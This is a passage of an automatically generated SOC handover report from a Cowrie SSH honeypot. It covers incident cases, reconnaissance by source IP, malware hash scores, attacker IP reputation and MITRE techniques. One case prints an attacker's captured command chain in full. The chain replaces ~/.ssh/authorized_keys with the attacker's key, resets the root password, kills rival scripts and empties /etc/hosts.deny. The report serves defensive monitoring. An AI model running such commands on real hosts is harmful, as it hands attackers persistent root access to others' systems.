- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67b3afc5313d

| Field | Detail |
|---|---|
| **Source IP** | `46.6.125[.]137` |
| **First Seen** | 2026-05-20 07:06 |
| **Last Seen** | 2026-05-20 07:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 07:06:45` | `cowrie.session.connect` |
| `2026-05-20 07:06:45` | `cowrie.client.version` |
| `2026-05-20 07:06:45` | `cowrie.client.kex` |
| `2026-05-20 07:06:45` | `cowrie.login.success` |
| `2026-05-20 07:06:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.6.125[.]137` to AbuseIPDB if not already reported
- [ ] Block `46.6.125[.]137` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4084826f47f5

| Field | Detail |
|---|---|
| **Source IP** | `46.6.125[.]137` |
| **First Seen** | 2026-05-20 07:09 |
| **Last Seen** | 2026-05-20 07:09 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:JUTUivrGXxKB"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 07:09:09` | `cowrie.session.connect` |
| `2026-05-20 07:09:09` | `cowrie.client.version` |
| `2026-05-20 07:09:09` | `cowrie.client.kex` |
| `2026-05-20 07:09:10` | `cowrie.login.success` |
| `2026-05-20 07:09:10` | `cowrie.session.params` |
| `2026-05-20 07:09:10` | `cowrie.command.input` |
| `2026-05-20 07:09:10` | `cowrie.command.failed` |
| `2026-05-20 07:09:10` | `cowrie.log.closed` |
| `2026-05-20 07:09:11` | `cowrie.session.params` |
| `2026-05-20 07:09:11` | `cowrie.command.input` |
| `2026-05-20 07:09:11` | `cowrie.session.file_download` |
| `2026-05-20 07:09:11` | `cowrie.log.closed` |
| `2026-05-20 07:09:11` | `cowrie.session.params` |
| `2026-05-20 07:09:11` | `cowrie.command.input` |
| `2026-05-20 07:09:11` | `cowrie.log.closed` |
| `2026-05-20 07:09:11` | `cowrie.session.params` |
| `2026-05-20 07:09:11` | `cowrie.command.input` |
| `2026-05-20 07:09:12` | `cowrie.log.closed` |
| `2026-05-20 07:09:12` | `cowrie.session.params` |
| `2026-05-20 07:09:12` | `cowrie.command.input` |
| `2026-05-20 07:09:12` | `cowrie.session.file_download` |
| `2026-05-20 07:09:12` | `cowrie.log.closed` |
| `2026-05-20 07:09:12` | `cowrie.session.params` |
| `2026-05-20 07:09:12` | `cowrie.command.input` |
| `2026-05-20 07:09:12` | `cowrie.log.closed` |
| `2026-05-20 07:09:13` | `cowrie.session.params` |
| `2026-05-20 07:09:13` | `cowrie.command.input` |
| `2026-05-20 07:09:13` | `cowrie.log.closed` |
| `2026-05-20 07:09:13` | `cowrie.session.params` |
| `2026-05-20 07:09:13` | `cowrie.command.input` |
| `2026-05-20 07:09:13` | `cowrie.command.input` |
| `2026-05-20 07:09:13` | `cowrie.log.closed` |
| `2026-05-20 07:09:14` | `cowrie.session.params` |
| `2026-05-20 07:09:14` | `cowrie.command.input` |
| `2026-05-20 07:09:14` | `cowrie.log.closed` |
| `2026-05-20 07:09:14` | `cowrie.session.params` |
| `2026-05-20 07:09:14` | `cowrie.command.input` |
| `2026-05-20 07:09:14` | `cowrie.log.closed` |
| `2026-05-20 07:09:14` | `cowrie.session.params` |
| `2026-05-20 07:09:14` | `cowrie.command.input` |
| `2026-05-20 07:09:15` | `cowrie.log.closed` |
| `2026-05-20 07:09:15` | `cowrie.session.params` |
| `2026-05-20 07:09:15` | `cowrie.command.input` |
| `2026-05-20 07:09:15` | `cowrie.log.closed` |
| `2026-05-20 07:09:15` | `cowrie.session.params` |
| `2026-05-20 07:09:15` | `cowrie.command.input` |
| `2026-05-20 07:09:15` | `cowrie.log.closed` |
| `2026-05-20 07:09:16` | `cowrie.session.params` |
| `2026-05-20 07:09:16` | `cowrie.command.input` |
| `2026-05-20 07:09:16` | `cowrie.log.closed` |
| `2026-05-20 07:09:16` | `cowrie.session.params` |
| `2026-05-20 07:09:16` | `cowrie.command.input` |
| `2026-05-20 07:09:16` | `cowrie.log.closed` |
| `2026-05-20 07:09:16` | `cowrie.session.params` |
| `2026-05-20 07:09:16` | `cowrie.command.input` |
| `2026-05-20 07:09:17` | `cowrie.log.closed` |
| `2026-05-20 07:09:17` | `cowrie.session.params` |
| `2026-05-20 07:09:17` | `cowrie.command.input` |
| `2026-05-20 07:09:17` | `cowrie.log.closed` |
| `2026-05-20 07:09:17` | `cowrie.session.params` |
| `2026-05-20 07:09:17` | `cowrie.command.input` |
| `2026-05-20 07:09:17` | `cowrie.log.closed` |
| `2026-05-20 07:09:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.6.125[.]137` to AbuseIPDB if not already reported
- [ ] Block `46.6.125[.]137` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `157.245.56[.]194` | **470** | 2026-05-20 04:12 | 2026-05-20 07:50 | 300m | 0 | `T1592` | 🟠 MEDIUM |
| `34.156.136[.]212` | **33** | 2026-05-20 07:46 | 2026-05-20 07:46 | 3m | 4 | `T1110.001` | 🟠 MEDIUM |
| `34.62.6[.]115` | **33** | 2026-05-20 06:57 | 2026-05-20 06:58 | 5m | 4 | `T1110.001` | 🟠 MEDIUM |
| `35.241.236[.]199` | **33** | 2026-05-20 06:20 | 2026-05-20 06:21 | 4m | 4 | `T1110.001` | 🟠 MEDIUM |
| `45.148.120[.]187` | **18** | 2026-05-20 03:58 | 2026-05-20 07:12 | 20m | 0 | `T1592` | 🟠 MEDIUM |
| `43.128.107[.]129` | **14** | 2026-05-20 05:44 | 2026-05-20 06:02 | 0m | 14 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `209.99.189[.]174` | **6** | 2026-05-20 06:02 | 2026-05-20 06:10 | 0m | 6 | `T1110.001 · T1592` | 🟢 LOW |
| `209.14.70[.]179` | **5** | 2026-05-20 05:44 | 2026-05-20 05:51 | 0m | 5 | `T1110.001 · T1592` | 🟢 LOW |
| `199.45.155[.]89` | **3** | 2026-05-20 06:35 | 2026-05-20 06:36 | 0m | 0 | `T1592` | 🟢 LOW |
| `171.25.158[.]70` | **2** | 2026-05-20 06:01 | 2026-05-20 06:06 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `3.131.220[.]121` | **2** | 2026-05-20 05:54 | 2026-05-20 05:58 | 0m | 0 | `T1592` | 🟢 LOW |
| `46.6.125[.]137` | **2** | 2026-05-20 06:50 | 2026-05-20 07:06 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `103.171.69[.]114` | 1 | 2026-05-20 05:59 | 2026-05-20 05:59 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `115.191.27[.]59` | 1 | 2026-05-20 04:25 | 2026-05-20 04:27 | 120s | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]130` | 1 | 2026-05-20 04:45 | 2026-05-20 04:45 | 10s | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `180.252.147[.]44` | 1 | 2026-05-20 06:02 | 2026-05-20 06:02 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `211.186.31[.]204` | 1 | 2026-05-20 05:50 | 2026-05-20 05:50 | 13s | 0 | `T1592` | 🟢 LOW |
| `39.104.169[.]129` | 1 | 2026-05-20 05:19 | 2026-05-20 05:19 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.156[.]19` | 1 | 2026-05-20 05:39 | 2026-05-20 05:39 | 4s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `180.252.147[.]44` | ID | PT TELKOM INDONESIA | **100** ⚠️ | 2 |
| `209.14.70[.]179` | BR | QNAX LTDA | **100** ⚠️ | 3 |
| `103.171.69[.]114` | BD | Multilink International | **100** ⚠️ | 8 |
| `46.6.125[.]137` | ES | Xfera Moviles SA / Yoigo | **100** ⚠️ | 15 |
| `35.241.236[.]199` | BE | Google LLC | **100** ⚠️ | 0 |
| `115.191.27[.]59` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 18 |
| `199.45.155[.]89` | HK | Censys, Inc. | **100** ⚠️ | 50 |
| `34.156.136[.]212` | BE | Google LLC | **100** ⚠️ | 0 |
| `3.131.220[.]121` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `39.104.169[.]129` | CN | Aliyun Computing Co., LTD | **100** ⚠️ | 7 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 64 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 41 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 28 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 15 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 15 |

---

## 🔕 False Positive Summary (9 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 1 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 6 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 665 cases |
| Tool 34  | Credential Extractor        | ✅ 73 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 6 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 28 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 9 filtered (1.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 23 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 28 priority case(s) shown individually · 19 recon entry/entries in table (12 group(s) consolidating 621 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-20T07:51:12Z_
